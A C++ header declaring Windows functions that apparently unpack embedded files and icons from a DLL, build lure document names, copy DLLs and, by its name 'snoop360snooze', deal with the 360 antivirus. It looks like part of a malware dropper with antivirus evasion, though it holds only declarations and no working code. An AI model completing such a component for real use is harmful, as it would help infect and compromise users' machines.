

#pragma once

#ifndef BOOTHELPER_H_H_H
#define BOOTHELPER_H_H_H


#include "api.h"
#include<windows.h>
#include "public.h"
#include <string>
#include <vector>
#include <json/json.h>

using namespace std;



DWORD ReleaseFile(char* szDstPath, char* filename, HMODULE lpThisDll);

DWORD ReleaseIcon(char* szDstPath, HMODULE lpThisDll);

char* GetLinkDocFileName(char* szDstBuf, char* szCurrentPath);

int backHome(char* pDstPath, char* szCurrentDir, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD* iDllCnt);

DWORD __stdcall snoop360snooze();

#endif